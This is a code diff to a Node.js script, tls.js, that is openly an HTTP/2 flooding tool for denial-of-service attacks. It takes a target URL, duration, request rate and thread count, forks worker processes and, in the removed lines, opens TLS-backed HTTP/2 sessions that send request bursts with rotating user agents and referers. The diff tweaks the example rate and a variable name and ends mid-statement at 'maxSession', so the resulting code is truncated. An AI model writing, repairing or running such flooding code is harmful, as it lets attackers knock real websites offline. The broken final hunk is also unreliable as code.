@@ -10,7 +10,7 @@ process.setMaxListeners(0);
 require('events').EventEmitter.defaultMaxListeners = 0;
 
 if (process.argv.length < 5) {
-    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 100 10`);
+    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 300 20`);
     process.exit();
 }
 
@@ -62,7 +62,7 @@ var userAgents = readLines('ua.txt');
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
-    Rate: ~~process.argv[4],
+    rate: ~~process.argv[4],
     threads: ~~process.argv[5],
 };
 
@@ -73,7 +73,7 @@ if (cluster.isMaster) {
         cluster.fork();
     }
 } else {
-    setInterval(runFlooder, 1000 / args.Rate); // Attack rate based on user input
+    setInterval(runFlooder, 1000 / args.rate); // Attack rate based on user input
 }
 
 class NetSocket {
@@ -217,30 +217,4 @@ function runFlooder() {
         const client = http2.connect(parsedTarget.href, {
             protocol: 'https:',
             settings: settings,
-            maxSessionMemory: 3333,
-            maxDeflateDynamicTableSize: 4294967295,
-            createConnection: () => tlsConn,
-        });
-
-        client.setMaxListeners(0);
-        client.settings(settings);
-
-        client.on('connect', () => {
-            const IntervalAttack = setInterval(() => {
-                for (let i = 0; i < args.Rate; i++) {
-                    headers['referer'] = 'https://' + randomElement(['example.com', 'test.com']); // Fix incomplete referer
-                    const req = client.request(headers);
-                    req.end();
-                }
-            }, 1000 / args.Rate);
-        });
-
-        client.on('error', (err) => {
-            console.error('HTTP/2 client error:', err);
-        });
-
-        client.on('close', () => {
-            clearInterval(IntervalAttack);
-        });
-    });
-}
+            maxSession
